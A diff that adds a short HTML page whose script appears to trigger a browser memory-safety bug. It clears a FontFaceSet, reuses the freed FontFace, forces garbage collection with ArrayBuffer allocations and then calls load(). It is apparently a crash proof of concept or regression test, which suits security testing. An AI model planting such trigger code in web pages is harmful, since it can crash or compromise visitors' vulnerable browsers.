@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+    <body>
+        <script>
+            function spin(){
+                
+            }
+            function gc(){
+                for(var i = 0; i < 100000; i++){
+                    new ArrayBuffer(0x10);
+                }
+            }
+            function start(){
+                var a = document.cloneNode(true);
+                var b = a.fonts;
+                var fontface = new FontFace("fontface","url()",{});
+                b.add(fontface);
+                b.clear();
+                var d = new FontFaceSet([fontface]);
+                spin();
+                gc();
+                fontface.load();
+                alert(fontface);
+            }
+        </script>
+        <button onclick="start()"></button>
+    </body>
+</html>
